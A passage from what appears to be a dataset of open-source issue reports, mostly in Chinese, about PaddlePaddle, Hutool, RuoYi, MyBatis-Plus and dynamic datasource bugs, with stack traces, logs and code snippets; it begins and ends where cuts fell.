mkl_dss.fi | |-- mkl_dss.h | |-- mkl.fi | |-- mkl.h | |-- mkl_lapacke.h | |-- mkl_lapack.fi | |-- mkl_lapack.h | |-- mkl_pardiso.f90 | |-- mkl_pardiso.fi | |-- mkl_pardiso.h | |-- mkl_pblas.h | |-- mkl_poisson.f90 | |-- mkl_poisson.h | |-- mkl_rci.f90 | |-- mkl_rci.fi | |-- mkl_rci.h | |-- mkl_scalapack.h | |-- mkl_service.f90 | |-- mkl_service.fi | |-- mkl_service.h | |-- mkl_solvers_ee.fi | |-- mkl_solvers_ee.h | |-- mkl_sparse_handle.f90 | |-- mkl_sparse_handle.fi | |-- mkl_sparse_handle.h | |-- mkl_spblas.f90 | |-- mkl_spblas.fi | |-- mkl_spblas.h | |-- mkl_trans.fi | |-- mkl_trans.h | |-- mkl_trig_transforms.f90 | |-- mkl_trig_transforms.h | |-- mkl_types.h | |-- mkl_version.h | |-- mkl_vml_defines.h | |-- mkl_vml.f90 | |-- mkl_vml.fi | |-- mkl_vml_functions.h | |-- mkl_vml.h | |-- mkl_vml_types.h | |-- mkl_vsl_defines.h | |-- mkl_vsl.f90 | |-- mkl_vsl.fi | |-- mkl_vsl_functions.h | |-- mkl_vsl.h | |-- mkl_vsl_subroutine.fi | -- lapack95 |-- lib | |-- intel64 -&gt; ./intel64_lin | -- tools |-- builder -- intel64_lin |-- libmkl_avx2.so |-- libmkl_avx512_mic.so |-- libmkl_avx512.so |-- libmkl_avx.so |-- libmkl_blas95_ilp64.a |-- libmkl_blas95_lp64.a |-- libmkl_core.a |-- libmkl_core.so |-- libmkl_def.so |-- libmkl_gf_ilp64.a |-- libmkl_gf_ilp64.so |-- libmkl_gf_lp64.a |-- libmkl_gf_lp64.so |-- libmkl_gnu_thread.a |-- libmkl_gnu_thread.so |-- libmkl_intel_ilp64.a |-- libmkl_intel_ilp64.so |-- libmkl_intel_lp64.a |-- libmkl_intel_lp64.so |-- libmkl_intel_thread.a |-- libmkl_intel_thread.so |-- libmkl_lapack95_ilp64.a |-- libmkl_lapack95_lp64.a |-- libmkl_mc3.so |-- libmkl_mc.so |-- libmkl_rt.so |-- libmkl_sequential.a |-- libmkl_sequential.so |-- libmkl_tbb_thread.a |-- libmkl_tbb_thread.so |-- libmkl_vml_avx2.so |-- libmkl_vml_avx512_mic.so |-- libmkl_vml_avx512.so |-- libmkl_vml_avx.so |-- libmkl_vml_cmpt.so |-- libmkl_vml_def.so |-- libmkl_vml_mc2.so |-- libmkl_vml_mc3.so |-- libmkl_vml_mc.so"
FileUtil.normalize 不支持windows共享目录路径 \\IP\\path,"JDK版本： openjdk_8_201 hutool版本： 5.4.5 Path [\IP\path1\path2] is not directory!   <code>: String path = ""\\\\IP\\path1\\path2""; int fileCount = FileUtil.ls(path).length; StaticLog.info(fileCount+"""");"
多个主键如何处理？,"DDL如下 CREATE TABLE ( int(11) NOT NULL, int(11) NOT NULL, bigint(20) NOT NULL DEFAULT '0', varchar(255) DEFAULT NULL, int(11) DEFAULT NULL, int(11) DEFAULT NULL, int(11) DEFAULT NULL, int(11) DEFAULT NULL, PRIMARY KEY (,,) USING BTREE ) ENGINE=InnoDB DEFAULT CHARSET=utf8 ROW_FORMAT=COMPACT COMMENT='名城军团贡献表'; 类似这个表有三个主键，如何生成   <code>: famous_contribution fid gid pid name country total hp kill fid gid pid"
enable mkldnn benchmark with googlenet,fix #5729:Bug fix in dense example of capi. GoogLeNet的脚本可以直接使用gpu的benchmark那个。 但是用CPU跑的时候会遇到些问题，所以需要稍微改下。 把只有GPU能跑的API换为了CPU可以支持的API。 CPU的不支持bias为True，所以改为False。同时，参考的README.md中GoogLeNet的concat layer也是不带bias的。 改完之后MKLDNN也同样可以跑了。   <code>: concat_layer
v4.7.4代码生成里面预览出现这个错误Unable to find resource 'vm/java/domain.java.vm',"如题所示，截图如下。 异常打印如下。   <code>: -2022-09-06 14:04:33.590 [XNIO-1 task-1] ERROR org.apache.velocity - [log,109]:109 - ResourceManager : unable to find resource 'vm/java/domain.java.vm' in any resource loader. -2022-09-06 14:04:33.593 [XNIO-1 task-1] ERROR c.r.f.w.e.GlobalExceptionHandler - [handleRuntimeException,96]:96 - 请求地址'/tool/gen/preview/1',发生未知异常. org.apache.velocity.exception.ResourceNotFoundException: Unable to find resource 'vm/java/domain.java.vm' at org.apache.velocity.runtime.resource.ResourceManagerImpl.loadResource(ResourceManagerImpl.java:452) at org.apache.velocity.runtime.resource.ResourceManagerImpl.getResource(ResourceManagerImpl.java:335) at org.apache.velocity.runtime.RuntimeInstance.getTemplate(RuntimeInstance.java:1102) at org.apache.velocity.runtime.RuntimeSingleton.getTemplate(RuntimeSingleton.java:324) at org.apache.velocity.app.Velocity.getTemplate(Velocity.java:524) at com.ruoyi.generator.service.impl.GenTableServiceImpl.previewCode(GenTableServiceImpl.java:227) at com.ruoyi.generator.service.impl.GenTableServiceImpl$$FastClassBySpringCGLIB$$49da1c7c.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy.invokeMethod(CglibAopProxy.java:386) at org.springframework.aop.framework.CglibAopProxy.access$000(CglibAopProxy.java:85) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:704) at com.ruoyi.generator.service.impl.GenTableServiceImpl$$EnhancerBySpringCGLIB$$a106f43b.previewCode(&lt;generated&gt;) at com.ruoyi.generator.controller.GenController.preview(GenController.java:237) at com.ruoyi.generator.controller.GenController$$FastClassBySpringCGLIB$$cf110d34.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:793) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:763) at org.apache.shiro.spring.security.interceptor.AopAllianceAnnotationsAuthorizingMethodInterceptor$1.proceed(AopAllianceAnnotationsAuthorizingMethodInterceptor.java:82) at org.apache.shiro.authz.aop.AuthorizingMethodInterceptor.invoke(AuthorizingMethodInterceptor.java:39) at org.apache.shiro.spring.security.interceptor.AopAllianceAnnotationsAuthorizingMethodInterceptor.invoke(AopAllianceAnnotationsAuthorizingMethodInterceptor.java:115) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:763) at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:97) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:763) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:708) at com.ruoyi.generator.controller.GenController$$EnhancerBySpringCGLIB$$abb27171.preview(&lt;generated&gt;) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:150) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:117) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:895) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1067) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:963) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898) at javax.servlet.http.HttpServlet.service(HttpServlet.java:497) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:584) at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:61) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AbstractShiroFilter.executeChain(AbstractShiroFilter.java:450) at org.apache.shiro.web.servlet.AbstractShiroFilter$1.call(AbstractShiroFilter.java:365) at org.apache.shiro.subject.support.SubjectCallable.doCall(SubjectCallable.java:90) at org.apache.shiro.subject.support.SubjectCallable.call(SubjectCallable.java:83) at org.apache.shiro.subject.support.DelegatingSubject.execute(DelegatingSubject.java:387) at org.apache.shiro.web.servlet.AbstractShiroFilter.doFilterInternal(AbstractShiroFilter.java:362) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:124) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at cn.dev33.satoken.filter.SaServletFilter.doFilter(SaServletFilter.java:178) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:96) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at com.ruoyi.common.xss.XssFilter.doFilter(XssFilter.java:50) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:117) at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.servlet.handlers.SendErrorPageHandler.handleRequest(SendErrorPageHandler.java:52) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.servlet.handlers.SessionRestoringHandler.handleRequest(SessionRestoringHandler.java:119) at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:275) at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:79) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:134) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:131) at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:255) at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:79) at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:100) at io.undertow.server.Connectors.executeRootHandler(Connectors.java:387) at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:852) at org.jboss.threads.ContextClassLoaderSavingRunnable.run(ContextClassLoaderSavingRunnable.java:35) at org.jboss.threads.EnhancedQueueExecutor.safeRun(EnhancedQueueExecutor.java:2019) at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.doRunTask(EnhancedQueueExecutor.java:1558) at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.run(EnhancedQueueExecutor.java:1449) at org.xnio.XnioWorker$WorkerThreadFactory$1$1.run(XnioWorker.java:1280) at java.lang.Thread.run(Thread.java:748) -2022-09-06 14:04:33.598 [XNIO-1 task-1] WARN o.s.w.s.m.m.a.ExceptionHandlerExceptionResolver - [logException,208]:208 - Resolved [org.apache.velocity.exception.ResourceNotFoundException: Unable to find resource 'vm/java/domain.java.vm']"
【众智】【计算-AICPU开发】NotEqual,AICPU算子接入 按元素计算两个张量的非等价性，返回真值运算后的结果。 x1 x2 y CPU 原有：bool、int8、int16、int32、int64、uint8、uint16、uint32、fp16、fp32、fp64 新增：uint64、cp64、cp128 Ascend: 原有：int8、uint8、int32、fp16、fp32 新增：bool、int16、int64、uint16、uint32、fp16、fp32、fp64、uint64、cp64、cp128 对应底层算子 对应底层AICPU算子NotEqual 库上已实现，返回zeros_like   <code>: class NotEqual(Primitive):
【论文复现】在命令行模式下，以下代码会报报错 broadcast should not into w broadcast，导致后向传播出现问题？求解答,"在命令行模式下，以下代码会报报错，导致后向传播出现问题？求解答 错误日志： 代码 <em>Originally posted by @liuxianyi in https://github.com/PaddlePaddle/Paddle/issues/26192#issuecomment-673821904</em>   <code>: import numpy as np import paddle,itertools import paddle.fluid as fluid from paddle.fluid.dygraph import to_variable import paddle.fluid.dygraph as nn class adaILN(nn.Layer): def __init__(self, num_features, eps=1e-5): super(adaILN, self).__init__() self.num_features = num_features self.eps = eps self.rho = fluid.layers.create_parameter(shape=[1,num_features,1,1], dtype='float32',is_bias=True, default_initializer=fluid.initializer.Constant(0.9)) def forward(self, input): ln_mean= fluid.layers.reduce_mean(input, dim=[1, 2, 3], keep_dim=True) out_ln = input - ln_mean out1 = (1-fluid.layers.expand(x=self.rho, expand_times=[input.shape[0], 1, 1, 1])) * out_ln # 经过初步调试，确定发生错误位置在此处，将此处注释不会报错 return out1 #高层API的组网方式需要继承Model，Model类实现了模型执行所需的逻辑 class SimpleNet(paddle.fluid.dygraph.Layer): def __init__(self): super(SimpleNet, self).__init__() self.conv = paddle.fluid.dygraph.Conv2D(1,1,filter_size=3,stride=1,padding=1) self.iln = adaILN(1) def forward(self, x): x = self.conv(x) x = self.iln(x) return x with paddle.fluid.dygraph.guard(paddle.fluid.CUDAPlace(0)): model1 = SimpleNet() Loss = nn.L1Loss() optim = fluid.optimizer.Adam(learning_rate=0.001, beta1=0.5, beta2=0.999, parameter_list=model1.parameters() ) model1.train() for i in range(20): x1 = np.random.random((2, 1, 256, 256)).astype('float32') x1 = to_variable(x1) e1= model1(x1) #print(e1) # e2 = model1(e1) loss2 = Loss(e1, x1) #print('loss:',loss.numpy()) # loss = loss1+loss2 print(loss2.numpy()) loss2.backward() optim.minimize(loss2) optim.clear_gradients()"
fatal error: snappy.h: No such file or directory,"My host machine is ubuntu 16.04. And PaddlePaddle for host following this can be successfully built. Now I wanted to build PaddlePaddle for Raspberry Pi following this guide. I used this command to build PaddlePaddle: And then encountered the error: /home/zfq/Paddle/build/third_party/snappy_stream/src/extern_snappystream/src/osnappystream.cpp:11:20: fatal error: snappy.h: No such file or directory #include ""snappy.h"" I found the ""snappy.h"" at , so I modified the by using absolute path as a workaround. But after this I met this error: /home/zfq/Paddle/build/third_party/snappy/src/extern_snappy/snappy.h:45:33: fatal error: snappy-stubs-public.h: No such file or directory #include ""snappy-stubs-public.h"" I also solved it by modified . After this I met this: /home/zfq/Paddle/paddle/math/MathFunctions.h:39:19: fatal error: cblas.h: No such file or directory #include &lt;cblas.h&gt; Now I am confused, does anyone know why? Maybe the raspberry_pi.cmake has some problem? Thank you in advance!   <code>: cmake -DCMAKE_SYSTEM_NAME=RPi -CMAKE_INSTALL_PREFIX=/home/zfq/Paddle/build/CAPI_ACL_RPi -DCMAKE_BUILD_TYPE=Debug -DWITH_C_API=ON -DWITH_SWIG_PY=OFF -DRPI_TOOLCHAIN=/home/zfq/tools/arm-bcm2708/gcc-linaro-arm-linux-gnueabihf-raspbian-x64 -DWITH_GPU=OFF -DWITH_PYTHON=OFF .. third_party/snappy/src/extern_snappy #include #include"
seqToseq translation demo,"This is a strange bug where the model has to be saved under a subdirectory within and cannot be saved onto the dynamically: E.g. if i want the save the model directory to , then from the demo works. Also, if i use a static full path, e.g. the model saves properly too, i.e. But if i use the same path as , Paddle will throw the error after the first epoch: To replicate the error above, change this line in to : It's a rather odd bug, although it can be simply solved by using fullpath, i.e.:   <code>: Paddle/demo/seqToseq/translation Paddle/demo/seqToseq/ translation/model train.sh /path/to/model/ paddle train \ --config='translation/train.conf' \ --save_dir='/path/to/model/' \ --use_gpu=false \ --num_passes=16 \ --show_parameter_stats_period=100 \ --trainer_count=4 \ --log_period=10 \ --dot_period=5 \ 2&gt;&amp;1 | tee 'translation/train.log' Paddle/demo/seqToseq/ I1025 15:11:11.968819 3359 TrainerInternal.cpp:163] Batch=200 samples=10000 AvgCost=54.3925 CurrentCost=47.7486 Eval: classification_error_evaluator=0.822107 CurrentEval: classification_error_evaluator=0.756779 I1025 15:11:11.968868 3359 TrainerInternal.cpp:180] Pass=0 Batch=200 samples=10000 AvgCost=54.3925 Eval: classification_error_evaluator=0.822107 I1025 15:11:37.395536 3359 Tester.cpp:111] Test samples=50000 cost=48.2543 Eval: classification_error_evaluator=0.758948 /home/ltan/Paddle/binary/bin/paddle: line 81: 3359 Segmentation fault (core dumped) ${DEBUGGER} $MYDIR/../opt/paddle/bin/paddle_trainer ${@:2} train.sh --save_dir='model' \ --save_dir='/home/ltan/Paddle/demo/seqToseq/model' \"
考虑加个@ClearCheckLogin注解,能不能考虑增加一个类似于的注解，用于清除类上的注解 使用场景：某个controller下有10个方法，其中9个都需要登录验证，只有1个不需要，那么可以直接在controller类上加上注解，然后在不需要登陆的那个方法上加上注解   <code>: @ClearCheckLogin @SaCheckLogin @SaCheckLogin @ClearCheckLogin
mybatis-plus 3.x 如何关联其他服务器数据库查询,"当前使用版本 mybatis-plus3.1.0 关联其他服务器的数据库引起的 SELECT COMPANY, LINECODE, LINENAME, FROMSTATIONNAME, TOSTATIONNAME, SERVICETYPENAME, DIRECTIONNAME, isnull( DRIVERCODE, '' ) DRIVERCODE, isnull( DRIVERNAME, '' ) DRIVERNAME, LONGITUDE, LATITUDE, isnull( BUSCODE, '' ) BUSCODE, BUSSPEED, isnull( 大牌号, '' ) BUSLIENCE FROM [192.168.181.47].[AFwebEbef].[dbo].[Ent_车辆实时状态] T LEFT JOIN [192.168.181.47].[ZCGZ].[dbo].[BusFiles] ON T.BUSCODE =自编号 WHERE BUSSTATUS = '在线' Caused by: net.sf.jsqlparser.JSQLParserException: null at net.sf.jsqlparser.parser.CCJSqlParserUtil.parseStatements(CCJSqlParserUtil.java:154) at com.baomidou.mybatisplus.core.parser.AbstractJsqlParser.parser(AbstractJsqlParser.java:60) ... 149 common frames omitted Caused by: net.sf.jsqlparser.parser.ParseException: Encountered unexpected token: ""["" ""["" at line 17, column 10.   <code>: AND BUSCODE = ?"
InferShape of some operators might fail in CompileTime,"The first dimension of most tensor variables is -1 in CompileTime，while some operators like , , haven't processed the unknown size correctly and might fail when inferring shapes in CompileTime.   <code>: split_op expand_op reshape_op"
star  mysql迁移至达梦8时 启动报错,"数据库从mysql迁移至达梦8时启动报错。 后经测试,将配置信息中的 jdbc.type 改写为 oracle 可以正常启动.请问这个配置项的 取值范围都是哪些? 当前连接达梦8的前提下,jdbc.type = oracle 是否可用？ 如不可用标准写法 = ？   <code>: Caused by: org.springframework.core.NestedIOException: Failed to parse config resource: class path resource [mybatis-config.xml]; nested exception is org.apache.ibatis.builder.BuilderException: Error parsing SQL Mapper Configuration. Cause: java.lang.RuntimeException: mybatis dialect error. at org.mybatis.spring.SqlSessionFactoryBean.buildSqlSessionFactory(SqlSessionFactoryBean.java:434) at org.mybatis.spring.SqlSessionFactoryBean.afterPropertiesSet(SqlSessionFactoryBean.java:340) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1689) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1627) ... 121 more Caused by: org.apache.ibatis.builder.BuilderException: Error parsing SQL Mapper Configuration. Cause: java.lang.RuntimeException: mybatis dialect error. at org.apache.ibatis.builder.xml.XMLConfigBuilder.parseConfiguration(XMLConfigBuilder.java:109) at org.apache.ibatis.builder.xml.XMLConfigBuilder.parse(XMLConfigBuilder.java:92) at org.mybatis.spring.SqlSessionFactoryBean.buildSqlSessionFactory(SqlSessionFactoryBean.java:428) ... 124 more Caused by: java.lang.RuntimeException: mybatis dialect error."
"多数据源的情况下,单一库事务支持存在问题.","JDK版本: 1.8 SpringBoot版本: 2.1.0.RELEASE 本程序版本: 2.5.3 当使用事务时,事务内部的代码都同一数据源,但是它使用的库不正确 期望值: 希望能使用到正确的数据源.希望能正确支持单库事务. 实际值: 事务内部,在同一个数据源下,使用的库不正确 重现步骤 在本项目的samples的 dynamic-mybatisplus2-sample 中稍微做了点修改.可以重现问题. 1.将com.baomidou.samples.mybatisplus2.service.impl.UserServiceImpl类的@DS注解值改为: @DS(""slave_2"") 2.增加一个manager类: 3.增加一个测试类: 4.运行结果: 2019-07-15 00:24:14.701 INFO 18704 --- [ main] c.b.s.m.test.ProcessManagerTest : Started ProcessManagerTest in 4.49 seconds (JVM running for 5.787) 2019-07-15 00:24:18.521 DEBUG 18704 --- [ main] c.b.d.d.DynamicRoutingDataSource : 从默认数据源中返回数据 2019-07-15 00:24:19.772 DEBUG 18704 --- [ main] c.b.d.d.DynamicRoutingDataSource : 从默认数据源中返回数据 2019-07-15 00:24:20.547 DEBUG 18704 --- [ main] c.b.s.m.mapper.UserMapper.insert : ==&gt; Preparing: INSERT INTO user ( age ) VALUES ( ? ) 2019-07-15 00:24:20.562 DEBUG 18704 --- [ main] c.b.s.m.mapper.UserMapper.insert : ==&gt; Parameters: 12(Integer) 2019-07-15 00:24:20.569 DEBUG 18704 --- [ main] c.b.s.m.mapper.UserMapper.insert : &lt;== Updates: 1 2019-07-15 00:24:20.594 DEBUG 18704 --- [ main] c.b.s.m.mapper.UserMapper.selectList : ==&gt; Preparing: SELECT id AS id,name,age FROM user WHERE (id = ?) 2019-07-15 00:24:20.606 DEBUG 18704 --- [ main] c.b.s.m.mapper.UserMapper.selectList : ==&gt; Parameters: 1(Integer) 2019-07-15 00:24:20.616 DEBUG 18704 --- [ main] c.b.s.m.mapper.UserMapper.selectList : &lt;== Total: 1 2019-07-15 00:24:20.617 DEBUG 18704 --- [ main] c.b.s.m.mapper.UserMapper.insert : ==&gt; Preparing: INSERT INTO user ( age ) VALUES ( ? ) 2019-07-15 00:24:20.617 DEBUG 18704 --- [ main] c.b.s.m.mapper.UserMapper.insert : ==&gt; Parameters: 13(Integer) 2019-07-15 00:24:20.618 DEBUG 18704 --- [ main] c.b.s.m.mapper.UserMapper.insert : &lt;== Updates: 1 2019-07-15 00:24:20.628 INFO 18704 --- [ Thread-3] o.s.s.concurrent.ThreadPoolTaskExecutor : Shutting down ExecutorService 'applicationTaskExecutor' 而将manager中的事务代码去掉后,如下: 得到的输出结果是正确的. 2019-07-15 00:31:38.324 WARN 17176 --- [e_3 housekeeper] com.zaxxer.hikari.pool.HikariPool : slave_3 - Thread starvation or clock leap detected (housekeeper delta=1m22s746ms891?s857ns). 2019-07-15 00:31:39.544 DEBUG 17176 --- [ main] c.b.d.d.DynamicRoutingDataSource : 从 slave_2 单数据源中返回数据源 2019-07-15 00:31:39.637 DEBUG 17176 --- [ main] c.b.s.m.mapper.UserMapper.insert : ==&gt; Preparing: INSERT INTO user ( age ) VALUES ( ? ) 2019-07-15 00:31:39.656 DEBUG 17176 --- [ main] c.b.s.m.mapper.UserMapper.insert : ==&gt; Parameters: 12(Integer) 2019-07-15 00:31:39.665 DEBUG 17176 --- [ main] c.b.s.m.mapper.UserMapper.insert : &lt;== Updates: 1 2019-07-15 00:31:39.692 DEBUG 17176 --- [ main] c.b.d.d.DynamicRoutingDataSource : 从 slave_2 单数据源中返回数据源 2019-07-15 00:31:39.693 DEBUG 17176 --- [ main] c.b.s.m.mapper.UserMapper.selectList : ==&gt; Preparing: SELECT id AS id,name,age FROM user WHERE (id = ?) 2019-07-15 00:31:39.702 DEBUG 17176 --- [ main] c.b.s.m.mapper.UserMapper.selectList : ==&gt; Parameters: 1(Integer) 2019-07-15 00:31:39.713 DEBUG 17176 --- [ main] c.b.s.m.mapper.UserMapper.selectList : &lt;== Total: 1 2019-07-15 00:31:39.713 DEBUG 17176 --- [ main] c.b.d.d.DynamicRoutingDataSource : 从 slave_2 单数据源中返回数据源 2019-07-15 00:31:39.713 DEBUG 17176 --- [ main] c.b.s.m.mapper.UserMapper.insert : ==&gt; Preparing: INSERT INTO user ( age ) VALUES ( ? ) 2019-07-15 00:31:39.714 DEBUG 17176 --- [ main] c.b.s.m.mapper.UserMapper.insert : ==&gt; Parameters: 13(Integer) 2019-07-15 00:31:39.714 DEBUG 17176 --- [ main] c.b.s.m.mapper.UserMapper.insert : &lt;== Updates: 1 2019-07-15 00:31:39.722 INFO 17176 --- [ Thread-3] o.s.s.concurrent.ThreadPoolTaskExecutor : Shutting down ExecutorService 'applicationTaskExecutor'   <code>: package com.baomidou.samples.mybatisplus2.manager; import com.baomidou.mybatisplus.mapper.Condition; import com.baomidou.samples.mybatisplus2.entity.User; import com.baomidou.samples.mybatisplus2.service.UserService; import org.springframework.stereotype.Service; import org.springframework.transaction.PlatformTransactionManager; import org.springframework.transaction.TransactionDefinition; import org.springframework.transaction.TransactionStatus; import org.springframework.transaction.support.DefaultTransactionDefinition; import javax.annotation.Resource; import java.util.List; @Service public class ProcessManager { @Resource private UserService userService; @Resource private PlatformTransactionManager platformTransactionManager; public void process() { DefaultTransactionDefinition definition = new DefaultTransactionDefinition(); 